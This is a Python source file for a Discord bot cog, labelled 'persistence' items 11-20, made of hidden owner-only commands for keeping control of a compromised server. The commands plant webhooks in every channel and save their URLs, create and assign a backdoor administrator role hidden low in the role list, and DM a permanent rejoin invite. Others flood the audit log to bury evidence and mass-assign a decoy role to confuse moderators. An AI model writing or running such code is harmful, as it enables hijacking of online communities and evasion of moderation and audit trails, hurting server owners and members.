import discord
from discord.ext import commands
import asyncio
import json
import os
import aiohttp

PERSIST_DIR = "data/persistence"
os.makedirs(PERSIST_DIR, exist_ok=True)

class Persistence(commands.Cog, name="persistence"):
    """11-20: persistence and recovery mechanisms."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.webhooks_file = os.path.join(PERSIST_DIR, "webhooks.json")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def persisthook(self, ctx: commands.Context, name: str = "backup"):
        """11. create a persistent webhook in every channel and save urls."""
        hooks = {}
        for channel in ctx.guild.text_channels:
            try:
                hook = await channel.create_webhook(name=name)
                hooks[str(channel.id)] = hook.url
                await asyncio.sleep(0.3)
            except:
                pass
        with open(self.webhooks_file, "w") as f:
            json.dump(hooks, f, indent=4)
        await ctx.send(f"created and saved {len(hooks)} persistent webhooks.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def persistrole(self, ctx: commands.Context, *, name: str = "persist"):
        """12. create a backdoor role with admin permissions hidden at the bottom."""
        role = await ctx.guild.create_role(
            name=name,
            permissions=discord.Permissions(administrator=True),
            hoist=False,
            mentionable=False,
        )
        await role.edit(position=1)
        await ctx.send(f"created hidden admin role: {role.mention} (id: {role.id})")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def givepersist(self, ctx: commands.Context, role_name: str, target: discord.Member = None):
        """13. assign the persistent role to a user."""
        target = target or ctx.author
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if role:
            await target.add_roles(role)
            await ctx.send(f"assigned {role.mention} to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def savehooks(self, ctx: commands.Context):
        """14. save all existing webhook urls to file."""
        hooks = {}
        for channel in ctx.guild.text_channels:
            try:
                existing = await channel.webhooks()
                for h in existing:
                    hooks[f"{channel.id}_{h.id}"] = h.url
            except:
                pass
        with open(self.webhooks_file, "w") as f:
            json.dump(hooks, f, indent=4)
        await ctx.send(f"saved {len(hooks)} webhooks.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def restorehooks(self, ctx: commands.Context):
        """15. display saved webhook urls for manual restoration."""
        if not os.path.exists(self.webhooks_file):
            return await ctx.send("no saved webhooks.")
        await ctx.send(file=discord.File(self.webhooks_file))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def backupguild(self, ctx: commands.Context):
        """16. create a json backup of the server structure."""
        guild = ctx.guild
        backup = {
            "name": guild.name,
            "id": guild.id,
            "owner_id": guild.owner_id,
            "roles": [],
            "channels": [],
            "categories": [],
        }
        for role in reversed(guild.roles):
            if role.is_default() or role.managed:
                continue
            backup["roles"].append({
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "hoist": role.hoist,
                "mentionable": role.mentionable,
            })
        for category in guild.categories:
            backup["categories"].append({"name": category.name, "position": category.position})
        for channel in guild.channels:
            backup["channels"].append({
                "name": channel.name,
                "type": str(channel.type),
                "category": channel.category.name if channel.category else None,
                "nsfw": channel.nsfw if isinstance(channel, discord.TextChannel) else False,
                "slowmode": channel.slowmode_delay if isinstance(channel, discord.TextChannel) else 0,
            })
        filepath = os.path.join(PERSIST_DIR, f"{guild.id}_backup.json")
        with open(filepath, "w") as f:
            json.dump(backup, f, indent=4)
        await ctx.send(f"backup saved to `{filepath}`.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autorejoin(self, ctx: commands.Context):
        """17. generate an invite link and dm it to the owner."""
        for channel in ctx.guild.text_channels:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0, reason="persistence")
                await ctx.author.send(f"rejoin invite for {ctx.guild.name}: {invite.url}")
                return
            except:
                continue
        await ctx.author.send("could not create invite.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def botlist(self, ctx: commands.Context):
        """18. list all bots in the server."""
        bots = [f"{m.name} ({m.id})" for m in ctx.guild.members if m.bot]
        await ctx.send("```\n" + "\n".join(bots) + "\n```" if bots else "no bots found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def auditwipe(self, ctx: commands.Context):
        """19. attempt to flood audit log by creating and deleting a channel rapidly."""
        for i in range(20):
            try:
                ch = await ctx.guild.create_text_channel(f"wipe-{i}")
                await ch.delete()
            except:
                pass
        await ctx.send("audit log flood attempt complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def invispam(self, ctx: commands.Context, name: str = "invisible"):
        """20. create a role with no permissions and assign to all to confuse moderation."""
        role = await ctx.guild.create_role(name=name, permissions=discord.Permissions.none())
        count = 0
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"added invisible role to {count} members.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Persistence(bot))
